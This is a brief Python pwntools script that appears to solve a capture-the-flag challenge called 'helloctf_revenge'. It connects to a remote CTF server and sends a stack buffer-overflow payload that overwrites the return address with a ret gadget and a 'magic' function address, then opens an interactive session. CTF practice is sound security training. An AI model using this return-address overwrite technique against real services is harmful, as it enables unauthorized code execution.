#!/usr/bin/python3
# -*- coding: UTF-8 -*-
from pwn import *

context.arch = 'amd64'

# p = process('./distribute/share/helloctf_revenge')
p = remote('ctf.adl.tw', 10001)

ret = 0x401271
magic = 0x40125b

payload = flat(
    "yes\0",
    cyclic(0x14),
    ret,
    magic
)

p.sendlineafter("Do you like VTuber?\n", payload)

p.interactive()
p.close()
